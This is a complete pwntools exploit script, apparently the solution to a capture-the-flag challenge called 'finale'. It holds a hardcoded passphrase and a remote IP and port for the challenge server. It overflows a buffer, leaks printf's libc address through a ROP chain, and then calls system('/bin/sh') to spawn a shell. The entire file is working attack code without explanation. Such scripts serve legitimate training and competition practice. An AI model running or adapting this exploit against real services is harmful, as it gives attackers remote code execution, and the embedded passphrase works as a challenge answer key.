from pwn import *

gs = '''
b *finale
continue
'''

elf = context.binary = ELF("./finale_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("83.136.253.61", 40026)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

io.sendlineafter(b"phrase: ", b"s34s0nf1n4l3b00")

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

print(f"[+] GOT: ", elf.got)

offset = 72

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(elf.got.printf),
    p64(elf.plt.puts),
    p64(elf.sym.finale)
])

io.sendlineafter(b"year: ", payload)

io.recvuntil("Spirit be with you!\n")

io.recvline()

leak_address = u64(io.recvline().strip().ljust(8, b"\x00"))

log.info(f"Leak Address: {hex(leak_address)}")

libc.address = leak_address - libc.sym.printf

log.info(f"System {hex(libc.sym.system)}")

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(next(libc.search(b"/bin/sh\x00"))),
    p64(ret),
    p64(libc.sym.system)
])

io.sendlineafter(b"year: ", payload)


io.interactive()
